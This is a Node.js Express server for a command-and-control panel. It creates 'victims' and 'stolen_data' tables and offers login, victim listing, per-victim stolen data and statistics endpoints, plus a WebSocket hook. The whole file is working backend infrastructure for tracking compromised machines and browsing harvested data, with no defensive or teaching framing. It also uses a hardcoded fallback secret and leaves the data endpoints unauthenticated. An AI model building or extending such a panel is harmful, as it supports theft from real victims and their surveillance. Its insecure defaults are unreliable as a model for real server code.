const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const { Pool } = require('pg');
const http = require('http');
const socketio = require('socket.io');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketio(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());

const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://postgres:password@localhost:5432/c2_panel'
});

const JWT_SECRET = process.env.JWT_SECRET || 'your_secret_key_here';

// Create tables
pool.query(`
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password_hash VARCHAR(255),
        created_at TIMESTAMP DEFAULT NOW()
    );
    CREATE TABLE IF NOT EXISTS victims (
        id SERIAL PRIMARY KEY,
        user_id INTEGER REFERENCES users(id),
        name VARCHAR(100),
        ip_address VARCHAR(45),
        country VARCHAR(50),
        city VARCHAR(50),
        os VARCHAR(100),
        status VARCHAR(20) DEFAULT 'active',
        first_seen TIMESTAMP DEFAULT NOW(),
        last_seen TIMESTAMP DEFAULT NOW()
    );
    CREATE TABLE IF NOT EXISTS stolen_data (
        id SERIAL PRIMARY KEY,
        victim_id INTEGER REFERENCES victims(id),
        data_type VARCHAR(50),
        data_content TEXT,
        source_url VARCHAR(500),
        captured_at TIMESTAMP DEFAULT NOW()
    );
`).catch(() => {});

// Register
app.post('/api/register', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
        
        const existing = await pool.query('SELECT id FROM users WHERE username = $1', [username]);
        if (existing.rows.length > 0) return res.status(400).json({ error: 'Username taken' });

        const hashed = await bcrypt.hash(password, 10);
        const result = await pool.query(
            'INSERT INTO users (username, password_hash) VALUES ($1, $2) RETURNING id, username',
            [username, hashed]
        );
        const token = jwt.sign({ id: result.rows[0].id }, JWT_SECRET, { expiresIn: '7d' });
        res.json({ token, user: result.rows[0] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Login
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        const result = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
        if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

        const valid = await bcrypt.compare(password, result.rows[0].password_hash);
        if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

        const token = jwt.sign({ id: result.rows[0].id }, JWT_SECRET, { expiresIn: '7d' });
        res.json({ token, user: { id: result.rows[0].id, username: result.rows[0].username } });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Verify token
app.get('/api/verify', async (req, res) => {
    try {
        const token = req.headers.authorization?.split(' ')[1];
        if (!token) return res.status(401).json({ error: 'No token' });
        const decoded = jwt.verify(token, JWT_SECRET);
        const result = await pool.query('SELECT id, username FROM users WHERE id = $1', [decoded.id]);
        if (result.rows.length === 0) return res.status(401).json({ error: 'User not found' });
        res.json({ user: result.rows[0] });
    } catch (err) {
        res.status(401).json({ error: 'Invalid token' });
    }
});

// Get victims
app.get('/api/victims', async (req, res) => {
    try {
        const userId = req.query.userId;
        const result = await pool.query(
            'SELECT * FROM victims WHERE user_id = $1 ORDER BY last_seen DESC',
            [userId]
        );
        res.json(result.rows);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get victim details
app.get('/api/victims/:id/details', async (req, res) => {
    try {
        const { id } = req.params;
        const victim = await pool.query('SELECT * FROM victims WHERE id = $1', [id]);
        const data = await pool.query('SELECT * FROM stolen_data WHERE victim_id = $1 ORDER BY captured_at DESC', [id]);
        res.json({ victim: victim.rows[0] || null, data: data.rows });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Stats
app.get('/api/stats', async (req, res) => {
    try {
        const userId = req.query.userId;
        const total = await pool.query('SELECT COUNT(*) FROM victims WHERE user_id = $1', [userId]);
        const active = await pool.query('SELECT COUNT(*) FROM victims WHERE user_id = $1 AND status = $2', [userId, 'active']);
        const data = await pool.query('SELECT COUNT(*) FROM stolen_data WHERE victim_id IN (SELECT id FROM victims WHERE user_id = $1)', [userId]);
        const recent = await pool.query('SELECT * FROM victims WHERE user_id = $1 ORDER BY last_seen DESC LIMIT 5', [userId]);
        res.json({
            total: parseInt(total.rows[0].count),
            active: parseInt(active.rows[0].count),
            data: parseInt(data.rows[0].count),
            recent: recent.rows
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// WebSocket
io.on('connection', (socket) => {
    console.log('Client connected');
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
